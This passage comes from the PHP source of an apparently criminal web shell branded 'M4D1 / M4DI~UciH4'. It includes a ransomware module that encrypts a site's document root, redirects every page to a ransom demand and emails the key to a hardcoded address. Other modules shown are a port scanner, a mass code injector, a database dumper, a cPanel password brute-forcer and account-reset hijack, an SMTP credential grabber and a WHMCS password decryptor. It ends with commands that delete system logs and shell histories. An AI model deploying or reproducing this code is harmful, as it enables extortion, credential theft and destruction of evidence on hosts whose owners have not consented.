E5yazNzUjZXK2NsTzE5MmhudytTeXJUcTUyNlpWNEFlc2xPR3d5cGZLTFhKUHZObS9TYzhwYnZUMWg4T3ROUXFnQUNZMlB4b1FFM0V1WTNFaFFkZFpBTjR0cEVBNnhhbU1YZUxlTXNTb05wejdiTzE3WDFsemEyUHRmcklCdGZhUmRpQWRCTmthYmEybTFWclgwSHpNMWtSS1NSRVFFUkVCRVJBUkVRRVJFQkVSQVJFUUVSRUJFUkF6OWxZNDA2aW5rRDdYblo5MU5yclVVQzRuQ1p2TmdiZmVndzFOcGxqZHZwL1l1T0JGbTVDYmw4ZmxJSEkybkw5MU40VXJnZDRYTW1lUHhQZEI4cEhwcVIxY0tqc3JrWEs4UDhUemo2NVJiaVkyenNlcHA2bmhlYUhhVzNWN3dKc05adTJhVzlxYlMxNHlCYnpiVVVjVFBlMTlyaTVOOUJ6bk45dGJhN1JtWW13R2dFU05XOTRkckE2THhNakpsWGNrM004eTBrUkVCRVJBUkVRRVJFQkVSQVJFUUVSRUJFUkFSRVFFU3NRS1JLeEEyZXhkczFNTzRLazI2VHIyeE45NmRhbFpqcnBPSFM3aDZyS2JxU1BLWlp0dTMwQ20zUUJvM0dhYmFXUERhMzBrRjJWaktqS016RXpZNG1vY3ZHVG8yMU84MjJTZTZzaVR1VHhtNDIwYld0cGU5LzhBTTAwdGlrU3NRS1JLeEFwRXJFQ2tTc1FLUkt5a0JFUkFSRVFFUkVELzJRPT0pOyBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7fQ0Kew0KLXdlYmtpdC1iYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsNCiAgIC1tb3otYmFja2dyb3VuZC1zaXplOiAxMDAlIDEwMCU7DQogICAtby1iYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsNCiAgIGJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0KfQ0KLm10ew0KICAgIGJvcmRlcjoxLjJweCBzb2xpZCBhcXVhOw0KICAgIGJhY2tncm91bmQtY29sb3I6IGJsYWNrOw0KICAgIGNvbG9yOiBsaW1lOw0KICAgIHdpZHRoOiAyMDBweDsNCiAgICBoZWlnaHQ6IDI1cHg7DQogICAgZm9udC1mYW1pbHk6IFVidW50dTsNCiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQouYnRjYWRkcmVzc3sNCiAgICBib3JkZXI6MC44cHggc29saWQgZ3JleTsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMUExQzFGOw0KICAgIGNvbG9yOiB5ZWxsb3c7DQogICAgdGV4dC1hbGlnbjogY2VudGVyOw0KICAgIHdpZHRoOiA0MDBweDsNCiAgICBoZWlnaHQ6IDI2cHg7DQogICAgZm9udC1zaXplOiAxNzsNCiAgICBmb250LWZhbWlseTogVWJ1bnR1Ow0KfQ0KLmVtYWlsew0KICAgIGJvcmRlcjowcHg7DQogICAgYmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7DQogICAgdGV4dC1hbGlnbjogY2VudGVyOyANCiAgICBjb2xvcjogYXF1YTsNCiAgICB3aWR0aDogMzEwcHg7DQogICAgaGVpZ2h0OiAzMHB4Ow0KICAgIGZvbnQtc2l6ZTogMjguNTsNCiAgICBmb250LWZhbWlseTogSWNlbGFuZDsNCn0NCnBsYWNlaG9sZGVyew0KCWNvbG9yOiB5ZWxsb3c7DQp9DQouZ2Fzew0KCWJhY2tncm91bmQtY29sb3I6IGJsYWNrOw0KCWNvbG9yOiBnb2xkOw0KCWJvcmRlcjogMS4ycHggc29saWQgZ29sZDsNCgl3aWR0aDogNzBweDsNCn0NCjwvc3R5bGU+DQo8Y2VudGVyPjxicj48YnI+PGJyPjxicj48Zm9udD4NCjxzcGFuIHN0eWxlPSJmb250OiA0MHB4IE1lcmllbmRhO2NvbG9yOnllbGxvdzsiPllvdXIgV2Vic2l0ZSBIYXMgYmVlbiBFbmNyeXB0DQo8aHIgd2lkdGg9IjkwJSI+PHNwYW4gc3R5bGU9J2ZvbnQ6IDEwcHggaWNlbGFuZDtjb2xvcjp3aGl0ZTt0ZXh0LXNoYWRvdzogMHB4IDBweCAxcHg7Jz58IFBheW1lbnQgQWRkcmVzcyB8PGJyPjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iYnRjYWRkcmVzcyIgdmFsdWU9InBheW1lbnR6IiByZWFkb25seT48YnI+DQo8c3BhbiBzdHlsZT0nZm9udDogMjVweCBpY2VsYW5kO2NvbG9yOnJlZDt0ZXh0LXNoYWRvdzogMHB4IDBweCAzcHg7Jz5NYWtlIGEgcGF5bWVudCBvciBJIGRlc3Ryb3kgeW91ciB3ZWJzaXRlIGFuZCBpdCB3aWxsIG5vdCByZXR1cm4gdG8gbm9ybWFsLCBieSBtYWtpbmcgYSBwYXltZW50IEkgd2lsbCBnaXZlIHlvdSBhIHBhc3N3b3JkIGFuZCB5b3VyIHdlYnNpdGUgd2lsbCByZXR1cm4gdG8gbm9ybWFsIDopDQo8YnI+PGJyPg0KCTxzcGFuIHN0eWxlPSdmb250OiA5cHggaWNlbGFuZDtjb2xvcjp3aGl0ZTt0ZXh0LXNoYWRvdzogMHB4IDBweCAxcHg7Jz58fiBQYXNzd29yZCB+fA0KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0Ij4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwYXNzIiBjbGFzcz0ibXQiIHBsYWNlaG9sZGVyPSJFbnRlciB5b3VyIGRlY3J5cHRpb24ga2V5Ij4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJnYXMiIHZhbHVlPSJEZWNyeXB0Ij4NCjwvZm9ybT4NCjxicj48YnI+DQo8Ym9keSBiZ2NvbG9yPWJsYWNrPjx0ZCBhbGlnbj1jZW50ZXI+DQo8c3BhbiBzdHlsZT0iZm9udDogMTNweCB1YnVudHU7Y29sb3I6Z29sZDsiPlsgTTREMSBSYW5zb21XYXJlIF0NCjxociB3aWR0aD0iNzAlIiBjb2xvcj0icmVkIj4NCgk8c3BhbiBzdHlsZT0nZm9udDogOC41cHggSWNlbGFuZDtjb2xvcjphcXVhO3RleHQtc2hhZG93OiAwcHggMHB4IDJweDsnPjw6OiBDb250YWN0IE1lIDo6Pg0KPGJyPjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZW1haWwiIHZhbHVlPSJ4WHggdW5kZXJ4cGxvaXRAZ21haWwuY29tIHhYeCIgcmVhZG9ubHk+PGJyPg0KPG1hcnF1ZWUgYmVoYXZpb3I9ImFsdGVybmF0ZSIgc2Nyb2xsYW1vdW50PSI1MCIgd2lkdGg9IjQ1MCI+IDxmb250IHNpemU9IjQiIGNvbG9yPSJzaWx2ZXIiPjxiPl9fX19fX19fX19fX19fX19fX19fPGZvbnQgc2l6ZT0iNCIgY29sb3I9InJlZCI+PGI+X19fX19fX19fX19fX19fX19fX19fX188Zm9udCBzaXplPSI0IiBjb2xvcj0ic2lsdmVyIj48Yj5fX19fX19fX19fX19fX19fX19fXzwvZm9udD48L21hcnF1ZWU+PGJyPg0KPC9odG1sPg==");
$q = str_replace('kontol', md5($_POST['pass']), $file);
$w = str_replace('djoatmail', $_POST['email'], $q);
$e = str_replace('paymentz', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('crypt.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "#M4D1 RansomWare\n
DirectoryIndex crypt.php\n
ErrorDocument 403 /crypt.php\n
ErrorDocument 404 /crypt.php\n
ErrorDocument 500 /crypt.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#FF0000">Locked</font> (<font color="#40CE08">Success</font>) <font color="#00FFFF">=></font> <font color="#2196F3">'.$filename.'</font> <br>';
}
function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
		}
	}
}
if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('crypt.php', $_SERVER['DOCUMENT_ROOT'].'/crypt.php');
$to=$_POST['email'];
$subject='M4DI~UciH4 Ransomware Informasi';
$message="Your Domain   : ".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."\n"."Your Password : ".$_POST['pass']."\n===================================\n"."IP Address     : ".$_SERVER['REMOTE_ADDR']."\n"."User Agent     : ".$_SERVER['HTTP_USER_AGENT'];
$too='indomilk87@gmail.com';
$title='M4DI~UciH4 Ransomware Informasi';
$pesan="Your Domain   : ".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."\n"."Your Password : ".$_POST['pass']."\n===================================\n"."IP Address     : ".$_SERVER['REMOTE_ADDR']."\n"."User Agent     : ".$_SERVER['HTTP_USER_AGENT'];
if(mail($to,$subject,$message))if(mail($too,$title,$pesan)){echo 'Password Saved In Your Mail !!!';}else{echo 'Password Not In Your Mail !!!';}exit();
}
?>
	<pre>
<h2><center><font color=red>M4DI~UciH4 Ransomware</h2></font></pre></center>
<form action="" method="post" style=" text-align: center;">
<font color="white">
    <label>Key : </label>
<input type="text" name="pass" class="inpute" placeholder="make a password">
      <select name="method" class="selecte">
         <option value="kontolbapakkau">Encrypt</option>
      </select><pre><br>
<label>Your Email : </label>
<input type="text" name="email" class="inpute">
<label>Your Payment Address : </label>
<input type="text" name="btc" class="inpute">
	<br>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
<?php

		} elseif (isset($_GET[hex('whois')])) {

			$dir = path();
			?>
				<form method="post">
					<?php
					@set_time_limit(0);
					@error_reporting(0);
					function sws_domain_info($site)
					{
						$getip = @file_get_contents("http://networktools.nl/whois/$site");
						flush();
						$ip = @findit($getip, '<pre>', '</pre>');
						return $ip;
						flush();
					}
					function sws_net_info($site)
					{
						$getip = @file_get_contents("http://networktools.nl/asinfo/$site");
						$ip = @findit($getip, '<pre>', '</pre>');
						return $ip;
						flush();
					}
					function sws_site_ser($site)
					{
						$getip = @file_get_contents("http://networktools.nl/reverseip/$site");
						$ip = @findit($getip, '<pre>', '</pre>');
						return $ip;
						flush();
					}
					function sws_sup_dom($site)
					{
						$getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=" . $site . "&Search+subdomains=Find+subdomains");
						$ip = @findit($getip, '<strong>Nameservers found:</strong>', '<script type="text/javascript">');
						return $ip;
						flush();
					}
					function sws_port_scan($ip)
					{
						$list_post = array('80', '21', '22', '2082', '25', '53', '110', '443', '143');
						foreach ($list_post as $o_port) {
							$connect = @fsockopen($ip, $o_port, $errno, $errstr, 5);
							if ($connect) {
								echo " $ip : $o_port ??? <u style=\"color: white\">Open</u> <br /><br />";
								flush();
							}
						}
					}
					function findit($mytext, $starttag, $endtag)
					{
						$posLeft = @stripos($mytext, $starttag) + strlen($starttag);
						$posRight = @stripos($mytext, $endtag, $posLeft + 1);
						return @substr($mytext, $posLeft, $posRight - $posLeft);
						flush();
					}
					echo '<br><br><center>';
					echo '
    <br /><hr>
	<div class="mybox">
	<h2>Whois M4DI~UciH4 Shell</h2>
	<form method="post"><table class="tabnet">
    <tr><td>Site to scan </td><td>:</td><td>
    <input type="text" name="site" size="50" style="color:black;background-color:#FFF" class="form-control" value="site.com" /> &nbsp <input class="form-control" type="submit" style="color:black;background-color:#FFF" name="scan" value="Scan !" /></td></tr>
    </table></form></div><hr><br>';
					if (isset($_POST['scan'])) {
						$site = @htmlentities($_POST['site']);
						if (empty($site)) {
							die('<br /><br /> Not add IP .. !');
						}
						$ip_port = @gethostbyname($site);
						echo "
   <br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>
   <div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
   <div class=\"ru\"> <br /><br /><pre>
   ";
						echo "" . sws_port_scan($ip_port) . " </pre></div> ";
						flush();
						echo "<div class=\"tit\"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
   <div class=\"ru\">
   <pre>" . sws_domain_info($site) . "</pre></div>";
						flush();
						echo "
   <div class=\"tit\"> <br /><br />|-------------- Network Info ------------------| <br /></div>
   <div class=\"ru\">
   <pre>" . sws_net_info($site) . "</pre> </div>";
						flush();
						echo "<div class=\"tit\"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>" . sws_sup_dom($site) . "</pre> </div>";
						flush();
						echo "<div class=\"tit\"> <br /><br />|-------------- Site Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>" . sws_site_ser($site) . "</pre> </div>
   <div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
						flush();
					}
					echo '</center>';
				} elseif (isset($_GET[hex('phpinfo')])) {

					echo "<hr><br><center>";
					echo "<h2>Server Php Info</h2>";
					echo phpinfo();
					echo "<hr><br></center>";
				} elseif (isset($_GET[hex('inject-code')])) {
					echo "<hr><br>";
					echo '<center><h2>Mass Code Injector M4D1 Shell</h2></center>';

					if (stristr(php_uname(), "Windows")) {
						$DS = "\\";
					} else if (stristr(php_uname(), "Linux")) {
						$DS = '/';
					}
					function get_structure($path, $depth)
					{
						global $DS;
						$res = array();
						if (in_array(0, $depth)) {
							$res[] = $path;
						}
						if (in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
							$tmp1 = glob($path . $DS . '*', GLOB_ONLYDIR);
							if (in_array(1, $depth)) {
								$res = array_merge($res, $tmp1);
							}
						}
						if (in_array(2, $depth) or in_array(3, $depth)) {
							$tmp2 = array();
							foreach ($tmp1 as $t) {
								$tp2 = glob($t . $DS . '*', GLOB_ONLYDIR);
								$tmp2 = array_merge($tmp2, $tp2);
							}
							if (in_array(2, $depth)) {
								$res = array_merge($res, $tmp2);
							}
						}
						if (in_array(3, $depth)) {
							$tmp3 = array();
							foreach ($tmp2 as $t) {
								$tp3 = glob($t . $DS . '*', GLOB_ONLYDIR);
								$tmp3 = array_merge($tmp3, $tp3);
							}
							$res = array_merge($res, $tmp3);
						}
						return $res;
					}

					if (isset($_POST['submit']) && $_POST['submit'] == 'Inject') {
						$name = $_POST['name'] ? $_POST['name'] : '*';
						$type = $_POST['type'] ? $_POST['type'] : 'html';
						$path = $_POST['path'] ? $_POST['path'] : getcwd();
						$code = $_POST['code'] ? $_POST['code'] : 'Pakistan Haxors Crew';
						$mode = $_POST['mode'] ? $_POST['mode'] : 'a';
						$depth = sizeof($_POST['depth']) ? $_POST['depth'] : array('0');
						$dt = get_structure($path, $depth);
						foreach ($dt as $d) {
							if ($mode == 'a') {
								if (file_put_contents($d . $DS . $name . '.' . $type, $code, FILE_APPEND)) {
									echo '<div><strong>' . $d . $DS . $name . '.' . $type . '</strong><span style="color:lime;"> was injected</span></div>';
								} else {
									echo '<div><span style="color:red;">failed to inject</span> <strong>' . $d . $DS . $name . '.' . $type . '</strong></div>';
								}
							} else {
								if (file_put_contents($d . $DS . $name . '.' . $type, $code)) {
									echo '<div><strong>' . $d . $DS . $name . '.' . $type . '</strong><span style="color:lime;"> was injected</span></div>';
								} else {
									echo '<div><span style="color:red;">failed to inject</span> <strong>' . $d . $DS . $name . '.' . $type . '</strong></div>';
								}
							}
						}
					} else {
						echo '<form method="post" action="">
        <center>
                <table align="center">
                    <tr><br>
                        <td>Directory : </td>
                        <td><input class = "form-control" type = "text" class="box" name="path" value="' . getcwd() . '" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select class = "form-control" style="width: 150px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td><br>
                            <input class = "form-control" type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                         
                            <select class = "form-control" style="width: 150px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td>
                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>        
                    <tr>
                        <td colspan="2"><textarea class = "form-control" name="code" style= "width:100%"></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="' . htmlspecialchars($GLOBALS['cwd']) . '">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '">
                            <input class = "form-control" style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    <br></tr>
                </table>
        </form>';
					}
					echo "<hr><br>";
				} elseif (isset($_GET[hex('db-dump')])) {
					echo '
<center><hr><br>
<form action method=post>
<table width=371 class=tabnet >
<h2>Database Dumper M4D1 Shell</h2>
<tr>
	<td>Server </td>
	<td><input class="form-control" type=text name=server size=52 autocomplete = "off"></td></tr><tr>
	<td>Username</td>
	<td><input class="form-control" type=text name=username size=52 autocomplete = "off"></td></tr><tr>
	<td>Password</td>
	<td><input class="form-control" type=text name=password size=52 autocomplete = "off"></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="form-control" type=text name=dbname size=52 autocomplete = "off"></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="' . $me . '">
	<select class="form-control" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
		<br>
	<input class="form-control" type=submit value="  Dump!  " ></td></tr>
	</form></center></table></div><hr><br>';
					if ($_POST['username'] && $_POST['dbname'] && $_POST['method']) {
						$date = date("Y-m-d");
						$dbserver = $_POST['server'];
						$dbuser = $_POST['username'];
						$dbpass = $_POST['password'];
						$dbname = $_POST['dbname'];
						$file = "Dump-$dbname-$date";
						$method = $_POST['method'];
						if ($method == 'sql') {
							$file = "Dump-$dbname-$date.sql";
							$fp = fopen($file, "w");
						} else {
							$file = "Dump-$dbname-$date.sql.gz";
							$fp = gzopen($file, "w");
						}
						function write($data)
						{
							global $fp;
							if ($_POST['method'] == 'ssql') {
								fwrite($fp, $data);
							} else {
								gzwrite($fp, $data);
							}
						}
						mysql_connect($dbserver, $dbuser, $dbpass);
						mysql_select_db($dbname);
						$tables = mysql_query("SHOW TABLES");
						while ($i = mysql_fetch_array($tables)) {
							$i = $i['Tables_in_' . $dbname];
							$create = mysql_fetch_array(mysql_query("SHOW CREATE TABLE " . $i));
							write($create['Create Table'] . ";nn");
							$sql = mysql_query("SELECT * FROM " . $i);
							if (mysql_num_rows($sql)) {
								while ($row = mysql_fetch_row($sql)) {
									foreach ($row as $j => $k) {
										$row[$j] = "'" . mysql_escape_string($k) . "'";
									}
									write("INSERT INTO $i VALUES(" . implode(",", $row) . ");n");
								}
							}
						}
						if ($method == 'ssql') {
							fclose($fp);
						} else {
							gzclose($fp);
						}
						header("Content-Disposition: attachment; filename=" . $file);
						header("Content-Type: application/download");
						header("Content-Length: " . filesize($file));
						flush();

						$fp = fopen($file, "r");
						while (!feof($fp)) {
							echo fread($fp, 65536);
							flush();
						}
						fclose($fp);
					}
				} elseif (isset($_GET[hex('cp-crack')])) {

					if ($_POST['crack']) {
						$usercp = explode("\r\n", $_POST['user_cp']);
						$passcp = explode("\r\n", $_POST['pass_cp']);
						$i = 0;
						foreach ($usercp as $ucp) {
							foreach ($passcp as $pcp) {
								if (@mysql_connect('localhost', $ucp, $pcp)) {
									if ($_SESSION[$ucp] && $_SESSION[$pcp]) {
									} else {
										$_SESSION[$ucp] = "1";
										$_SESSION[$pcp] = "1";
										if ($ucp == '' || $pcp == '') {
										} else {
											$i++;
											if (function_exists('posix_getpwuid')) {
												$domain_cp = file_get_contents("/etc/named.conf");
												if ($domain_cp == '') {
													$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
												} else {
													preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
													foreach ($domains_cp[1] as $dj) {
														$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
														$user_cp_url = $user_cp_url['name'];
														if ($user_cp_url == $ucp) {
															$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
															break;
														}
													}
												}
											} else {
												$dom = "<font color=red>function is Disable by system</font>";
											}
											echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
										}
									}
								}
							}
						}
						if ($i == 0) {
						} else {
							echo "<br>sukses nyolong " . $i . " Cpanel by <font color=lime>Exc Shell.</font>";
						}
					} else {
						echo'<center> 
	<h1>Cpanel Reset Password</h1> 
	</center><center>
	<form action="#" method="post"> 	 <input type="email" name="email" placeholder="Your Email" /> 	 <input type="submit" name="submit" value="Crack"/></center> 	 
	</form> 	 	 
	<br/><br/><br/> 
	</p>'; ?> <?php $IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf) { echo "<center><h1>Gak Bisa Di Akses Goblok!!!</center></h1>
	<br><br> 
	</pre>
	</center>"; } else { echo "<center>Salin Username Nya<br><br>
	</center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Klik Disini</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gass</a><br><br></center>'; ;}}
	echo '</td></tr><tr><td>';
					}
				} elseif (isset($_GET[hex('smtp-grab')])) {
					$dir = path();
					echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
					function scj($dir)
					{
						$dira = scandir($dir);
						foreach ($dira as $dirb) {
							if (!is_file("$dir/$dirb")) continue;
							$ambil = file_get_contents("$dir/$dirb");
							$ambil = str_replace("$", "", $ambil);
							if (preg_match("/JConfig|joomla/", $ambil)) {
								$smtp_host = ambilkata($ambil, "smtphost = '", "'");
								$smtp_auth = ambilkata($ambil, "smtpauth = '", "'");
								$smtp_user = ambilkata($ambil, "smtpuser = '", "'");
								$smtp_pass = ambilkata($ambil, "smtppass = '", "'");
								$smtp_port = ambilkata($ambil, "smtpport = '", "'");
								$smtp_secure = ambilkata($ambil, "smtpsecure = '", "'");
								echo "<center>";
								echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
								echo "SMTP port: <font color=lime>$smtp_port</font><br>";
								echo "SMTP user: <font color=lime>$smtp_user</font><br>";
								echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
								echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
								echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
								echo "</center>";
							}
						}
					}
					$smpt_hunter = scj($dir);
					echo $smpt_hunter;
				} elseif (isset($_GET[hex('domains')])) {

					echo "<center>
		<div class='mybox'>
		<p align='center' class='cgx2'>Domains and Users</p>";
					$d0mains = @file("/etc/named.conf");
					if (!$d0mains) {
						die("<center>Error : can't read [ /etc/named.conf ]</center>");
					}
					echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';
					foreach ($d0mains as $d0main) {
						if (eregi("zone", $d0main)) {
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
							if (strlen(trim($domains[1][0])) > 2) {
								$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domains[1][0]));
								echo "<tr><td><a href=http://www." . $domains[1][0] . "/>" . $domains[1][0] . "</a></td><td>" . $user['name'] . "</td></tr>";
								flush();
							}
						}
					}
					echo '</div></center>';
				} elseif (isset($_GET[hex('whmcs-decoder')])) {

					echo '<form action="" method="post">';

					function decrypt($string, $cc_encryption_hash)
					{
						$key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
						$hash_key = _hash($key);
						$hash_length = strlen($hash_key);
						$string = base64_decode($string);
						$tmp_iv = substr($string, 0, $hash_length);
						$string = substr($string, $hash_length, strlen($string) - $hash_length);
						$iv = $out = '';
						$c = 0;
						while ($c < $hash_length) {
							$iv .= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
							++$c;
						}
						$key = $iv;
						$c = 0;
						while ($c < strlen($string)) {
							if (($c != 0 and $c % $hash_length == 0)) {
								$key = _hash($key . substr($out, $c - $hash_length, $hash_length));
							}
							$out .= chr(ord($key[$c % $hash_length]) ^ ord($string[$c]));
							++$c;
						}
						return $out;
					}

					function _hash($string)
					{
						if (function_exists('sha1')) {
							$hash = sha1($string);
						} else {
							$hash = md5($string);
						}
						$out = '';
						$c = 0;
						while ($c < strlen($hash)) {
							$out .= chr(hexdec($hash[$c] . $hash[$c + 1]));
							$c += 2;
						}
						return $out;
					}

					echo "
<hr><br>
<br><center><h2>Whmcs Decoder M4D1 Shell</h2></center>

<center>
<br>

<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS Decoder</th></tr>
<tr><td>db_host </td><td><input  type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#000;background-color:' type='text' class='form-control' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='form-control' type='submit' style='color:#000;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
<hr><br>
";

					if ($_POST['form_action'] == 2) {
						//include($file);
						$db_host = ($_POST['db_host']);
						$db_username = ($_POST['db_username']);
						$db_password = ($_POST['db_password']);
						$db_name = ($_POST['db_name']);
						$cc_encryption_hash = ($_POST['cc_encryption_hash']);



						$link = mysql_connect($db_host, $db_username, $db_password);
						mysql_select_db($db_name, $link);
						$query = mysql_query("SELECT * FROM tblservers");
						while ($v = mysql_fetch_array($query)) {
							$ipaddress = $v['ipaddress'];
							$username = $v['username'];
							$type = $v['type'];
							$active = $v['active'];
							$hostname = $v['hostname'];
							echo ("<center><table border='1'>");
							$password = decrypt($v['password'], $cc_encryption_hash);
							echo ("<tr><td>Type</td><td>$type</td></tr>");
							echo ("<tr><td>Active</td><td>$active</td></tr>");
							echo ("<tr><td>Hostname</td><td>$hostname</td></tr>");
							echo ("<tr><td>Ip</td><td>$ipaddress</td></tr>");
							echo ("<tr><td>Username</td><td>$username</td></tr>");
							echo ("<tr><td>Password</td><td>$password</td></tr>");

							echo "</table><br><br></center>";
						}

						$link = mysql_connect($db_host, $db_username, $db_password);
						mysql_select_db($db_name, $link);
						$query = mysql_query("SELECT * FROM tblregistrars");
						echo ("<center>Domain Reseller <br><table class=tabnet border='1'>");
						echo ("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
						while ($v = mysql_fetch_array($query)) {
							$registrar     = $v['registrar'];
							$setting = $v['setting'];
							$value = decrypt($v['value'], $cc_encryption_hash);
							if ($value == "") {
								$value = 0;
							}
							$password = decrypt($v['password'], $cc_encryption_hash);
							echo ("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
						}
					}
				} elseif (isset($_GET[hex('delete-logs')])) {

					echo '<br><center><b><span>Delete Logs ( For Safe )</span></b><center><br>';
					echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";
					exec("rm -rf /tmp/logs");
					exec("rm -rf /root/.ksh_history");
					exec("rm -rf /root/.bash_history");
					exec("rm -rf /root/.bash_logout");
					exec("rm -rf /usr/local/apache/logs");
					exec("rm -rf /usr/local/apache/log");
					exec("rm -rf /var/apache/logs");
					exec("rm -rf /var/apache/log");
					exec("rm -rf /var/run/utmp");
					exec("rm -rf /var/logs");
					exec("rm -rf /var/log");
					exec("rm -rf /var/adm");
					exec("rm -rf /etc/wtmp");
